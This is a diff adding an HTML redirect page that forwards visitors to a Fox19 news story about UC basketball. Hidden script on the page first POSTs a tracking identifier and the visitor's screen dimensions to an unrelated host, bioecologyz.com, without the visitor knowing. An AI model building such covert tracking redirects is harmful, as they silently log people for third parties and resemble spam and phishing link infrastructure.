@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+                                            <html>
+                                                 <head>
+                                                 <meta http-equiv="refresh" content="0; url = http://www.fox19.com/story/34479584/uc-basketball-will-play-2017-18-season-at-nkus-bbt-arena" />
+
+                                                           <script type="text/javascript">
+
+    
+                                                            var width = screen.width;
+                                                            var height = screen.height;
+         
+                                                            var data = '0f0bd6d2-8b72-4c3b-962d-1c74795e683b&' + width + '&' + height;
+
+                                                            var oReq = new XMLHttpRequest();
+                        
+                                                            oReq.open("POST", 'http://bioecologyz.com/log',true);
+                                                            oReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                                                            oReq.onreadystatechange = function() 
+                                                            {
+                                                                  if (this.readyState == 4 && this.status == 200) 
+                                                                  {
+                                                                     window.location.href = "http://www.fox19.com/story/34479584/uc-basketball-will-play-2017-18-season-at-nkus-bbt-arena";
+                                                                  }
+                                                            };
+
+                                                            oReq.send(data);
+
+                                                       </script>    
+
+                                                 </head>
+                                                 <body>
+
+         
+                                                 </body>
+                                            </html>
+                                            
